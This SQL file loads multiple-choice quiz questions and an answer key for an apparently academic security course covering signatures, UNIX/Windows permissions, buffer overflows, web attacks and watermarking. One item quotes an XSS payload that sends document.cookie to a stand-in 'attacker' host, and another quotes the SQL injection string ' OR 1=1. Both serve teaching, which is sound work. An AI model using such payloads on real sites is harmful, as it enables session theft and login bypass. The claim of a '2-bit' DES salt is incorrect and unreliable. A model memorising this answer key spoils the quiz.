INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'Bob receives a digitally signed contract from Sue. To validate the signature, Bob successfully computes the hash of the contract. What must he do with Sue''s public key next, and what determines if the signature is definitively valid?', '["Decrypt the attached hash with Sue''s public key; valid if it matches his computed hash","Encrypt the contract with Sue''s public key","Hash Sue''s public key and compare","Decrypt with his own private key"]', 0, 'Bob must decrypt the original attached hash (the signature) using *Sue''s Public Key*. If the hash value he computed matches the hash value he decrypted, the signature is valid.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'Does UNIX have a unified security architecture?', '["No; UNIX explicitly does not have a security architecture","Yes; UNIX has a unified, centrally managed architecture","Yes; via Active Directory","Only on the kernel level"]', 0, 'No! UNIX explicitly does not have a security architecture.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'Which Windows kernel-mode component is responsible for ACL verification?', '["The Security Reference Monitor","The Local Security Authority (LSA)","The Security Accounts Manager (SAM)","Active Directory"]', 0, 'The Security Reference Monitor.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'Which Windows user-mode component contains the accounts database and password encryption?', '["The Security Accounts Manager (SAM)","The Security Reference Monitor","The Local Security Authority (LSA)","The Access Token"]', 0, 'The Security Accounts Manager (SAM).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'What does the acronym SID stand for in Windows security?', '["Security Identifier","System Identity Descriptor","Secure Inode Directory","Session ID"]', 0, 'Security Identifier.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'State the mathematical difference between a UNIX UID and a Windows SID in terms of size/format.', '["A UID is a fixed 16-bit number; a SID is a variable-length machine-generated code","A UID is variable length; a SID is fixed 16-bit","Both are fixed 32-bit numbers","A UID is a string; a SID is an integer"]', 0, 'A UNIX UID is a fixed 16-bit number, whereas a Windows SID is a machine-generated code of varying length (e.g., S-1-5-18).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'What are the four components of a Windows Object Security Descriptor?', '["Owner SID, Primary Group SID, DACL, SACL","LSA, SAM, SRM, UAC","UID, GID, inode, umask","TGT, TGS, AS, SID"]', 0, 'Owner SID, Primary Group SID, DACL, and SACL.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'In Windows, is the ability to "shut down a system" considered a Privilege or an Access Right?', '["A Privilege","An Access Right","A DACL entry","A capability"]', 0, 'A Privilege.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'In Linux, what does the octal permission `644` translate to in text format?', '["rw-r--r-- (owner read/write, group read, others read)","rwxr--r--","rw-rw-r--","r--r--r--"]', 0, '`rw-r--r--` (Owner: read/write, Group: read-only, Others: read-only).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'What does the "Sticky flag" do when applied to a directory in Linux?', '["Only the file owner (or root) can remove files in that directory","It makes the directory read-only","It runs files under the owner privilege","It hides the directory contents"]', 0, 'It ensures that only the owner of a file (or root) can remove files within that directory.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'Name three security options that can be applied to the Linux `mount` command to restrict external file systems.', '["-r (read-only), -o nosuid, -o noexec, -o nodev","-w, -x, -r, -o exec","-o suid, -o dev, -o exec","-r, -o setuid, -o sticky"]', 0, 'Any three of: `-r` (read-only), `-o nosuid`, `-o noexec`, or `-o nodev`.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'What is the difference between the `fork` and `vfork` commands in UNIX?', '["fork creates an identical child; vfork is the same but shares memory","fork shares memory; vfork creates a copy","fork replaces the process image; vfork spawns a child","They are identical"]', 0, '`fork` spawns a new identical child process, whereas `vfork` is the same but memory is shared between the two processes.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'What is the fundamental difference between the *real* UID and the *effective* UID in a Linux process?', '["Real UID is inherited from the parent; effective UID may come from the parent or the executed file owner","Real UID comes from the file owner; effective from the parent","They are always identical","Effective UID is always 0"]', 0, 'The real UID is always inherited from the parent process, whereas the effective UID can be inherited from the parent OR from the owner of the executed file.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'Which Linux password encryption method uses a 2-bit salt and encrypts a 64-bit string using a 56-bit key?', '["DES","MD5","SHA-1","Blowfish"]', 0, 'DES.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'Which Linux logging file specifically stores kernel events, errors, and warnings?', '["/var/log/kern.log","/etc/passwd","/var/log/auth.log","/etc/shadow"]', 0, '`/var/log/kern.log`.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'What are the three primary design goals of UNIX (which took priority over security)?', '["Modularity, portability, efficiency","Confidentiality, integrity, availability","Security, speed, simplicity","Authentication, authorisation, auditing"]', 0, 'Modularity, portability, and efficiency.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'Name three security features that are explicitly listed as "missing" in standard UNIX.', '["Any three of: ACLs, Data labeling, Mandatory access control, Capabilities, Standardized auditing","Firewalls, IDS, VPNs","SUID, sticky bit, umask","SID, DACL, SACL"]', 0, 'Any three of: ACLs in general, Data labeling, Mandatory access control, Capabilities, Standardized auditing.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'What Windows 10 security enhancement protects user credentials using hardware-based virtualization/isolation?', '["Credential Guard","Device Guard","Windows Hello","Trusted Boot"]', 0, 'Credential Guard.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'What Windows Access Right allows a user to change an object''s DACL?', '["WRITE_DAC","WRITE_OWNER","GENERIC_READ","SeShutdownPrivilege"]', 0, '`WRITE_DAC`.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'A Linux user creates a new file. The system''s default permission for files is 666. If the administrator has set the system''s `umask` to `033`, what will the final octal permission of the newly created file be?', '["644","633","666","755"]', 0, 'The final octal permission will be `644`.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'A developer writes a new program. The system''s default permission for programs is 777. If the `umask` is `027`, what will the final octal permission be, and what does this mean in plain English for the Owner, Group, and Others?', '["750: owner rwx, group r-x, others none","755: owner rwx, group r-x, others r-x","640: owner rw-, group r--, others none","777: full access for everyone"]', 0, 'The final octal permission will be `750`. This means the Owner has read/write/execute access, the Group has read and execute access, and Others have no access.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'Define "Malware" according to the slides.', '["Program code executed without a user''s consent that carries out harmful functionality","Any program that accesses the network","Software with a graphical interface","A legally licensed application"]', 0, 'Program code executed without a user''s consent and carrying out harmful functionality.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'Name the four components that make up a stack frame.', '["Function arguments, Return address, Frame pointer, Local variables","Heap, Stack, Registers, Cache","Owner, Group, Others, Sticky","DEP, ASLR, Canary, Salt"]', 0, 'Function arguments, Return address, Frame pointer, and Local variables.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'Name the three security mechanisms that protect the stack against buffer overflow attacks.', '["Data Execution Protection, Address Space Layout Randomisation, Canaries","Firewalls, VPNs, IDS","Encryption, Hashing, Salting","DEP, SQL escaping, input filtering"]', 0, 'Data Execution Protection (DEP), Address Space Layout Randomisation (ASLR), and Canaries.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'In web security, what does an XSRF (Cross-Site Request Forging) attack exploit?', '["An existing authenticated session, by tricking the browser into sending a forged request","A buffer overflow in the login form","An unfiltered script reflected to the browser","A weak password hash"]', 0, 'It exploits an existing authenticated session (like an active session cookie) by tricking the browser into sending a forged request.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What is the difference between GET and POST HTTP methods?', '["GET puts parameters in the URI (no side-effects); POST puts them in the body (potential side-effects)","GET sends data in the body; POST in the URI","GET has side-effects; POST is safe","They are identical"]', 0, 'GET retrieves a resource (parameters in URI, safe/no side-effects), whereas POST sends data to a server (parameters in body, potential side-effects).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'Name the three defence mechanisms against SQL Injection.', '["Validate/Sanitise Input, Parameterised Input, SQL Escape","DEP, ASLR, Canaries","Encryption, Hashing, Salting","Firewall, IDS, VPN"]', 0, 'Validate/Sanitise Input, Parameterised Input, and SQL Escape.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What is the main difference between encryption and digital watermarking?', '["Encryption makes a document unreadable without a key; watermarking leaves it intact and recognisable","Both make the document unreadable","Watermarking needs a key; encryption does not","Encryption hides a marker inside the file"]', 0, 'Encryption transforms a document to make it unreadable without a key, whereas watermarking leaves the original document intact and recognisable.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'Name the five characteristics (requirements) of a good digital watermark.', '["Unobtrusive, Readily Detectable, Unambiguous, Innumerable, Robust","Encrypted, Compressed, Signed, Hashed, Salted","Fast, Cheap, Small, Visible, Editable","Spatial, Frequency, Text, Audio, Video"]', 0, 'Unobtrusive, Readily Detectable, Unambiguous, Innumerable, and Robust.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What are the three techniques used for Text Watermarking?', '["Text Line Coding, Word-shift Coding, Character/Typeface Encoding","LSB, MSB, Frequency shifting","Jitter, StirMark, Cropping","DEP, ASLR, Canaries"]', 0, 'Text Line Coding, Word-shift Coding, and Character/Typeface Encoding.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What is the difference between Spatial and Frequency Domain watermarking?', '["Spatial changes pixel LSBs; Frequency Domain applies the watermark in low-frequency redundant areas","Spatial uses frequency transforms; Frequency Domain edits pixels","Both edit the same pixel bits","Spatial is robust; Frequency is fragile"]', 0, 'Spatial watermarking changes pixel values in the lower bit plane (LSB), whereas Frequency Domain watermarking converts the image and applies the watermark in low frequency redundant data areas.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'How does a SQL injection attack bypass a password check using the string `'' OR 1=1`?', '["It makes the WHERE clause always true (1=1), granting access even with an empty password","It deletes the password table","It encrypts the query","It overflows the login buffer"]', 0, 'It modifies the SQL query so that the password check evaluates to true (since `1=1` is always true), permitting access even if the password field is empty.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'Name three applications of digital watermarking.', '["Any three of: Ownership Assertion, Fingerprinting, Authentication, Content labeling, Usage control","DEP, ASLR, Canaries","GET, POST, PUT","Virus, Worm, Trojan"]', 0, 'Any three of: Ownership Assertion, Fingerprinting/Content Protection, Authentication & integrity verification, Content labeling, Usage control & Copy protection.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What specific stack frame component does a buffer overflow attacker target to hijack the execution flow?', '["The return address","The frame pointer","The heap","The function arguments"]', 0, 'The return address.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What are the six steps of Malware Incident Handling?', '["Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned","Detect, Analyse, Contain, Erase, Restore, Review","Prevention, Detection, Recovery","Scan, Patch, Monitor, Report, Audit, Close"]', 0, 'Preparation, Identification, Containment, Eradication, Recovery, and Lessons Learned.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What does a StirMark attack simulate by applying geometric distortions (stretching, shearing, shifting, rotation)?', '["The printing/scanning process","A network flooding attack","Lossy compression","An LSB plane removal"]', 0, 'It simulates the printing/scanning process.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What specifically does a "Canary" do to protect the stack?', '["It precedes the return value with a special value and checks if it changed after the call","It encrypts the return address","It randomises the stack layout","It marks the stack non-executable"]', 0, 'It precedes the return value with a special value, checking if the content has changed after the call to prevent execution if altered.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'What is the mechanism of a "Jitter attack" in the context of digital watermarking?', '["It splits the signal into chunks and duplicates or deletes them at random, tweaking lower-order bits","It applies geometric stretching and rotation","It floods the watermark detector","It encrypts the watermark bits"]', 0, 'It splits the signal into chunks and tweaks the lower-order bits by duplicating or deleting chunks at random.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'Your company''s web application returns user input without filtering. An attacker submits a form containing `<script>window.location=''http://attacker/?cookie=''+document.cookie</script>`. When an innocent user views the page, their browser executes this. What specific type of attack is this?', '["Cross-Site Scripting (XSS)","Cross-Site Request Forging (XSRF)","SQL Injection","Buffer Overflow"]', 0, 'Cross-Site Scripting (XSS).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'extended'), 'An attacker inputs a string longer than 128 bytes into a vulnerable C function `strcpy(buf, str)`. The buffer overspills into the adjacent upper stack area. What type of vulnerability is this, and what is the primary defensive mechanism that randomises the stack memory allocation to prevent it?', '["Buffer Overflow; defended by Address Space Layout Randomisation (ASLR)","SQL Injection; defended by parameterised input","XSS; defended by input filtering","CSRF; defended by anti-forgery tokens"]', 0, 'This is a Buffer Overflow. The defensive mechanism is Address Space Layout Randomisation (ASLR).');
